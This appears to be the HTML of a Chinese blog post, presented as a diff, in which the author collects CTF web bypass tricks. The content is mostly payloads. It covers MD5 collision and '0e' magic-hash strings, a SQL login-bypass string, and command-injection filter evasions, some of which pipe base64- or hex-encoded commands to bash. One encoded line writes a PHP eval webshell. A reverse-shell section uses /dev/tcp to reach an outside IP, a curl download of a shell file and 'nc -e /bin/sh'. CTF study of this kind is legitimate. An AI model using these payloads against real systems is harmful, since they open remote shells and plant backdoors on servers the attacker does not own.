@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="md5绕过1、数组绕过a[]&#x3D;1&amp;b[]&#x3D;2 2、碰撞12id&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2gg&#x3D;M">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些绕过（md5，命令注入）">
+<meta property="og:url" content="https://ta3shi.github.io/2021/02/19/raoguo/index.html">
+<meta property="og:site_name" content="ta3shi 个人学习自用">
+<meta property="og:description" content="md5绕过1、数组绕过a[]&#x3D;1&amp;b[]&#x3D;2 2、碰撞12id&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2gg&#x3D;M">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-02-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-13T13:27:00.015Z">
+<meta property="article:author" content="ta3shi">
+<meta property="article:tag" content="ctfweb">
+<meta property="article:tag" content="bypass">
+<meta property="article:tag" content="cmdInject">
+<meta property="article:tag" content="md5Bypass">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>一些绕过（md5，命令注入）</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2021/01/06/%E5%8F%8D%E5%BC%B9shell/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2021/02/19/raoguo/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2021/02/19/raoguo/&text=一些绕过（md5，命令注入）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2021/02/19/raoguo/&is_video=false&description=一些绕过（md5，命令注入）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一些绕过（md5，命令注入）&body=Check out this article: https://ta3shi.github.io/2021/02/19/raoguo/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2021/02/19/raoguo/&name=一些绕过（md5，命令注入）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2021/02/19/raoguo/&t=一些绕过（md5，命令注入）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#md5%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">md5绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">1、数组绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%A2%B0%E6%92%9E"><span class="toc-number">1.2.</span> <span class="toc-text">2、碰撞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%810e%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">3、0e绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">4、万能密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81md4-0e%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">5、md4 0e绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">命令注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.1.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E2%80%9D-%E2%80%9C"><span class="toc-number">2.2.</span> <span class="toc-text">反斜杠”&#x2F;“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">2.3.</span> <span class="toc-text">黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">2.4.</span> <span class="toc-text">命令分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="toc-number">2.5.</span> <span class="toc-text">特殊变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">2.6.</span> <span class="toc-text">长度限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">2.7.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">2.8.</span> <span class="toc-text">通配符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.9.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.10.</span> <span class="toc-text">读取文件的命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">正则绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">异或绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">取反绕过</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        一些绕过（md5，命令注入）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ta3shi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-18T16:00:00.000Z" class="dt-published" itemprop="datePublished">2021-02-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctf%E7%BB%83%E4%B9%A0/">ctf练习</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/bypass/" rel="tag">bypass</a>, <a class="p-category" href="/tags/cmdInject/" rel="tag">cmdInject</a>, <a class="p-category" href="/tags/ctfweb/" rel="tag">ctfweb</a>, <a class="p-category" href="/tags/md5Bypass/" rel="tag">md5Bypass</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h1><h2 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h2><p>a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h2 id="2、碰撞"><a href="#2、碰撞" class="headerlink" title="2、碰撞"></a>2、碰撞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">gg=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
+<h2 id="3、0e绕过"><a href="#3、0e绕过" class="headerlink" title="3、0e绕过"></a>3、0e绕过</h2><p>md5(770hQgrBOjrcqftrlaZk) &#x3D;&gt; 0e689b4f703bdc753be7e27b45cb3625</p>
+<p>md5(md5(770hQgrBOjrcqftrlaZk)) &#x3D;&gt; 0e2756da68ef740fd8f5a5c26cc45064<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p>
+<h2 id="4、万能密码"><a href="#4、万能密码" class="headerlink" title="4、万能密码"></a>4、万能密码</h2><p>ffifdyop</p>
+<h2 id="5、md4-0e绕过"><a href="#5、md4-0e绕过" class="headerlink" title="5、md4 0e绕过"></a>5、md4 0e绕过</h2><p>0e251288019</p>
+<h1 id="命令注入绕过"><a href="#命令注入绕过" class="headerlink" title="命令注入绕过"></a>命令注入绕过</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>cat&lt;&#x2F;flag<br>{cat,&#x2F;flag}<br>cat$IFS&#x2F;flag<br><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等</code></p>
+<h2 id="反斜杠”-“"><a href="#反斜杠”-“" class="headerlink" title="反斜杠”&#x2F;“"></a>反斜杠”&#x2F;“</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;HOME:0:1&#125;</span><br><span class="line"> . | tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27;</span><br><span class="line"> tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27; &lt;&lt;&lt; .</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">w\ho\am\i</span><br><span class="line">/\b\i\n/////s\h</span><br><span class="line">w&#x27;h&#x27;o&#x27;am&#x27;i</span><br><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br><span class="line">who$@ami</span><br><span class="line">a=l;b=s;$a$b</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag</span><br><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</span><br><span class="line">$(printf &quot;\154\163&quot;) ==&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
+<h2 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h2><table>
+<thead>
+<tr>
+<th>变量</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td align="left">当前脚本的文件名</td>
+</tr>
+<tr>
+<td>$n</td>
+<td align="left">传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</td>
+</tr>
+<tr>
+<td>$#</td>
+<td align="left">传递给脚本或函数的参数个数</td>
+</tr>
+<tr>
+<td>$*</td>
+<td align="left">传递给脚本或函数的所有参数，而参数不存在时其值为空。</td>
+</tr>
+<tr>
+<td>$@</td>
+<td align="left">传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同</td>
+</tr>
+<tr>
+<td>$?</td>
+<td align="left">上个命令的推出状态，或函数的返回值</td>
+</tr>
+<tr>
+<td>$$</td>
+<td align="left">当前shell进程ID</td>
+</tr>
+</tbody></table>
+<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><p>linux下可以用 1&gt;a创建文件名为a的空文件<br>ls -t&gt;test则会将目录按时间排序后写进test文件中<br>sh命令可以从一个文件中读取命令来执行</p>
+<h2 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h2><p>反引号或$</p>
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td>？</td>
+<td>匹配任意单个字符</td>
+</tr>
+<tr>
+<td>[list]</td>
+<td>匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合</td>
+</tr>
+<tr>
+<td>[^list]</td>
+<td>匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+<tr>
+<td>[!list]</td>
+<td>同[^list]</td>
+</tr>
+<tr>
+<td>{str1,str2}</td>
+<td>匹配str1或者str2字符，也可以是集合</td>
+</tr>
+<tr>
+<td>IFS</td>
+<td>由<space>或<tab>或</td>
+</tr>
+<tr>
+<td>CR</td>
+<td>由<enter>产生</td>
+</tr>
+<tr>
+<td>!</td>
+<td>执行history中的命令</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ echo d&#123;a,e,i,u,o&#125;g</span><br><span class="line">dag deg dig dug dog</span><br><span class="line"></span><br><span class="line">#大括号可以嵌套使用</span><br><span class="line">$ echo &#123;j&#123;p,pe&#125;g,png&#125;</span><br><span class="line">jpg jpeg png</span><br><span class="line">#&#123;start…end&#125;匹配连续字符</span><br><span class="line">$ cat /f&#123;0…z&#125;ag</span><br><span class="line">this_is_you_find_flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>1、curl<br>在主机&#x2F;var&#x2F;www&#x2F;html写shell.txt文件,内容为<br><code>bash -i&gt;&amp; /dev/tcp/174.0.230.89/666 0&gt;&amp;1</code><br>主机监听<code>nc -lvp 666</code><br>靶机访问<code>curl http://174.0.230.89/shell.txt</code><br>2、nc<br>主机监听<code>nc -lvp 666</code><br>靶机<code>nc ip port -e /bin/sh</code></p>
+<h2 id="读取文件的命令"><a href="#读取文件的命令" class="headerlink" title="读取文件的命令"></a>读取文件的命令</h2><p>cat、tac、more、less、head、tail、nl、sed、sort、uniq</p>
+<h1 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h1><h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><p><code>$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo   //$_GET[%0ff]</code></p>
+<h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#md5%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">md5绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">1、数组绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%A2%B0%E6%92%9E"><span class="toc-number">1.2.</span> <span class="toc-text">2、碰撞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%810e%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">3、0e绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">4、万能密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81md4-0e%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">5、md4 0e绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">命令注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.1.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E2%80%9D-%E2%80%9C"><span class="toc-number">2.2.</span> <span class="toc-text">反斜杠”&#x2F;“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">2.3.</span> <span class="toc-text">黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">2.4.</span> <span class="toc-text">命令分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="toc-number">2.5.</span> <span class="toc-text">特殊变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">2.6.</span> <span class="toc-text">长度限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">2.7.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">2.8.</span> <span class="toc-text">通配符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.9.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.10.</span> <span class="toc-text">读取文件的命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">正则绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">异或绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">取反绕过</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2021/02/19/raoguo/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2021/02/19/raoguo/&text=一些绕过（md5，命令注入）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2021/02/19/raoguo/&is_video=false&description=一些绕过（md5，命令注入）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一些绕过（md5，命令注入）&body=Check out this article: https://ta3shi.github.io/2021/02/19/raoguo/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
